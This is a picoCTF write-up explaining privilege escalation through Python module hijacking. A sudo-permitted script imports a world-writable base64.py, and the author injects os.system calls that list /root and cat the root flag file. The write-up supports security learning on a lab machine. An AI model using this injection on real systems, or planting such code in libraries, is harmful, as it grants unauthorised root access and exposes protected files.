---
title: "Hijacking"
date: "2025-07-14"
tags: ["picoCTF", "sudo", "python module hijack"]
---

This exercise gives us an ssh session.

If we do a bit of enumeration on the machine we can see 2 interesting things:

1. A .server.py file in the picoctf folder

```python
import base64
import os
import socket
ip = 'picoctf.org'
response = os.system("ping -c 1 " + ip)
#saving ping details to a variable
host_info = socket.gethostbyaddr(ip) 
#getting IP from a domaine
host_info_to_str = str(host_info[2])
host_info = base64.b64encode(host_info_to_str.encode('ascii'))
print("Hello, this is a part of information gathering",'Host: ', host_info)
```

2. Sudoer

```c
picoctf@challenge:~$ sudo -l
Matching Defaults entries for picoctf on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoctf may run the following commands on challenge:
    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
```

I tried a PATH hijacking but had no luck. After that we can look at whether we can hijack the libraries instead.

First let's see where the libraries live:

```bash
picoctf@challenge:~$ python3
Python 3.8.10 (default, May 26 2023, 14:05:08) 
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import sys
>>> print(sys.path)
['', '/usr/lib/python38.zip', '/usr/lib/python3.8', '/usr/lib/python3.8/lib-dynload', '/usr/local/lib/python3.8/dist-packages', '/usr/lib/python3/dist-packages']
```

Browsing those directories we can see some critical permissions on one of the libraries the program uses

```bash
-rwxrwxrwx 1 root root  20382 May 26  2023 base64.py
```

Let's add the following lines to the file to get a quick map of the root directory and find the flag:

```python
import os
os.system('ls -al /root > /home/picoctf/mapeo.txt')
```

We can add this line to the file and get the flag:

```python
os.system('cat /root/.flag.txt')
```

```python
picoctf@challenge:~$ sudo /usr/bin/python3 /home/picoctf/.server.py
picoCTF{SECRETO} # FLAG
sh: 1: ping: not found
Traceback (most recent call last):
  File "/home/picoctf/.server.py", line 7, in <module>
    host_info = socket.gethostbyaddr(ip) 
socket.gaierror: [Errno -5] No address associated with hostname
picoctf@challenge:~$ Connection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.
```
